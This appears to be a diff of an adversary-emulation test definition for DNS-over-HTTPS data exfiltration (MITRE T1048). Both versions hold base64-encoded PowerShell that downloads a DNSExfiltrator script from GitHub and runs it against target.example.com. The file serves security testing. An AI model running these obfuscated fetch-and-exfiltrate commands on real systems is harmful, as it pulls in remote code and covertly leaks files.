@@ -1,17 +1,15 @@
-- id: b41c964a-0bfb-52ee-b0c2-ad168038831e
+- requirements: []
   name: Soumaia ART Tests - DNSExfiltration (doh)
   description: "DNSExfiltrator enables the transfer (exfiltration) of a file over a DNS request covert channel. This is basically a data leak testing tool allowing to exfiltrate data over a covert channel.\n!!! Test will fail without a domain under your control with A record and NS record !!! \nSee this github page for more details - https://github.com/Arno0x/DNSExfiltrator"
   tactic: exfiltration
-  technique:
-    attack_id: T1048
-    name: Exfiltration Over Alternative Protocol
-  platforms:
-    windows:
-      psh:
-        command: |-
-          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIAJABlAG4AdgA6AFQARQBNAFAAXABBAFIAVAAtAEUAeAB0AGUAcgBuAGEAbABQAGEAeQBsAG8AYQBkAHMAXABkAG4AcwBlAHgAZgBpAGwALgBwAHMAMQAiACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AAoA
-          if ($LASTEXITCODE -ne 0) {
-              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAQQBSAFQALQBFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzACIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAEkAZwBuAG8AcgBlACAALQBGAG8AcgBjAGUAIAB8ACAATwB1AHQALQBOAHUAbABsAAoASQBXAFIAIAAiAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AQQByAG4AbwAwAHgALwBEAE4AUwBFAHgAZgBpAGwAdAByAGEAdABvAHIALwA4AGYAYQBhADkANwAyADQAMAA4AGIAMAAzADgANAA0ADEANgBmAGYAZgBkADUAYgA0AGQANAAyAGEANwBhAGEAMAAwADUAMgA2AGMAYQA4AC8ASQBuAHYAbwBrAGUALQBEAE4AUwBFAHgAZgBpAGwAdAByAGEAdABvAHIALgBwAHMAMQAiACAALQBPAHUAdABGAGkAbABlACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAEEAUgBUAC0ARQB4AHQAZQByAG4AYQBsAFAAYQB5AGwAbwBhAGQAcwBcAGQAbgBzAGUAeABmAGkAbAAuAHAAcwAxACIACgA=
-          }
-          Import-Module "$env:TEMP\ART-ExternalPayloads\dnsexfil.ps1"
-          Invoke-DNSExfiltrator -i "$env:TEMP\ART-ExternalPayloads\dnsexfil.ps1" -d target.example.com -p atomic -doh google -t 500 #{encoding}
+  technique_id: T1048
+  technique_name: Exfiltration Over Alternative Protocol
+  executors:
+  - cleanup: []
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads: []
+    parsers: []
+    command: powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIAJABlAG4AdgA6AFQARQBNAFAAXABBAFIAVAAtAEUAeAB0AGUAcgBuAGEAbABQAGEAeQBsAG8AYQBkAHMAXABkAG4AcwBlAHgAZgBpAGwALgBwAHMAMQAiACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AAoA; if ($LASTEXITCODE -ne 0) { powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAiACQAZQBuAHYAOgBUAEUATQBQAFwAQQBSAFQALQBFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzACIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAEkAZwBuAG8AcgBlACAALQBGAG8AcgBjAGUAIAB8ACAATwB1AHQALQBOAHUAbABsAAoASQBXAFIAIAAiAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AQQByAG4AbwAwAHgALwBEAE4AUwBFAHgAZgBpAGwAdAByAGEAdABvAHIALwA4AGYAYQBhADkANwAyADQAMAA4AGIAMAAzADgANAA0ADEANgBmAGYAZgBkADUAYgA0AGQANAAyAGEANwBhAGEAMAAwADUAMgA2AGMAYQA4AC8ASQBuAHYAbwBrAGUALQBEAE4AUwBFAHgAZgBpAGwAdAByAGEAdABvAHIALgBwAHMAMQAiACAALQBPAHUAdABGAGkAbABlACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAEEAUgBUAC0ARQB4AHQAZQByAG4AYQBsAFAAYQB5AGwAbwBhAGQAcwBcAGQAbgBzAGUAeABmAGkAbAAuAHAAcwAxACIACgA= }; Import-Module "$env:TEMP\ART-ExternalPayloads\dnsexfil.ps1"; Invoke-DNSExfiltrator -i "$env:TEMP\ART-ExternalPayloads\dnsexfil.ps1" -d target.example.com -p atomic -doh google -t 500
+  id: b41c964a-0bfb-52ee-b0c2-ad168038831e
